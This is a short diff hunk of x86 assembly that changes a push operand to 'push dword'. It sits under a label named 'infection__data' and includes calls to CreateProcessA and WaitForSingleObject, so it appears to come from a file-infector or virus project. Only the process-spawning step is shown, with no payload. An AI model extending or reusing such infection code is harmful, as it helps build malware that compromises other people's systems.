@@ -85,7 +85,7 @@ infection__data:
    jz infection__end            ; CreateProcessA failed
 
    push 0xFFFFFFFF
-   push [ebp-0x58]
+   push dword [ebp-0x58]
    call edi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
    test eax,eax
    jnz infection__end           ; WaitForSingleObject returns 0 on success
